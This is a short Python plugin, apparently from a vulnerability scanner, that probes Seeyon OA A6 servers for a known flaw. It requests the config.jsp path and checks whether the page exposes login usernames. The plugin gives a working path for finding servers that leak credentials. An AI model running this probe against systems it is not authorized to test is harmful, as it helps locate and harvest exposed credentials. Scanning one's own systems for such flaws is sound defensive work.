#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = "https://peiqi.wgpsec.org/wiki/oa/致远OA/致远OA A6 config.jsp 敏感信息泄漏漏洞.html"
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "致远OA A6 config.jsp 敏感信息泄漏漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = "/yyoa/ext/trafaxserver/SystemManage/config.jsp"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=10,verify=False)
    if res.status_code == 200 and "登录用户名" in res.text:
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret